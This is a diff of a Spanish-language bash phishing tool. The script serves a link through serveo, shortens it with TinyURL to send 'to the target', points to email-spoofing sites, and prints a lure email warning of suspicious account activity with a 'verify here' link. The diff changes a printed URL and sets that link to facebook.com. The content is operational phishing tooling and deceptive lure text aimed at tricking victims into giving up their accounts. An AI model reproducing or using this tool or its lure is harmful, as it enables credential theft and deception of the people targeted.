@@ -365,7 +365,7 @@ send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
 printf "\n"
 printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Envía el enlace directo al objetivo:\e[0m\e[1;77m %s \n' $send_link
 send_ip=$(curl -s http://tinyurl.com/api-create.php?url=$send_link | head -n1)
-printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] o puedes usar Tinyurl:\e[0m\e[1;77m %s \n' $send_ip
+printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] o puedes usar Tinyurl: https://emaildepruebas.000webhostapp.com/\e[0m\e[1;77m %s \n' $send_ip
 printf "\e[1;77m....\e[0m\e[1;93m Tambien puedes enviar Email Spoof en los siguientes enlaces:\e[0m\e[1;77m...\e[0m\n"
 printf "\e[1;92m[\e[0m*\e[1;92m] https://emaildepruebas.000webhostapp.com/ \e[0m\e[1;77m %s\e[0m\n"
 printf "\e[1;92m[\e[0m*\e[1;92m] https://pruebaemailspoof.000webhostapp.com/ \e[0m\e[1;77m %s\e[0m\n"
@@ -376,7 +376,7 @@ printf "\e[1;92m  <h3>Hemos notado una actividad sospechoza en tu cuenta</h3> \e
 printf "\e[1;92m  <h3>solicitamos que verifiques inmeditamente</h3> \e[0m\n"
 printf "\e[1;92m  <h3>podria tratarse que alguien ingreso a tu cuenta sin previo aviso</h3> \e[0m\n" 
 printf "\e[1;92m  <h3>verifica en el siguiente enlace..</h3> \e[0m\n"
-printf "\e[1;92m  <a href='aqui tu enlace'>Aqui</a> \e[0m\n"
+printf "\e[1;92m  <a href='http://facebook.com'>Aqui</a> \e[0m\n"
 checkfound
 
 
